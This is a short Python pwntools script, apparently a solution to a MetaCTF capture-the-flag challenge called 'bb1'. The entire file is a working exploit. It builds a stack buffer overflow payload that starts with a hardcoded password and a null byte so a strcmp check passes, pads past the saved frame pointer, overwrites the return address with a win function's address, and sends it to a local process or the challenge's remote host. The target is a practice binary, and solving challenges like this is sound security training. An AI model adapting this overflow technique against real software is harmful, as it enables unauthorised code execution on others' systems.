from pwn import *

# --- Info ---
# CTF: MetaCTF
# Date: *
# Challenge: bb1
# Description: Very simple Buffer Overflow (pass strcmp adding NULL and jump to win)
# --- End Info ---

HOST = 'host1.metaproblems.com'
PORT = 5151
PATH = './bb1'

REMOTE = 0

r = remote(HOST, PORT) if REMOTE else process(PATH)
r.recvuntil('code:')

pwd = 'Sup3rs3cr3tC0de\x00'
win = 0x0000000000401172

payload = '' + pwd
payload += 'A'*(48 - len(pwd))
payload += 'B'*8 # RBP
payload += p64(win)

r.sendline(payload)

r.interactive()


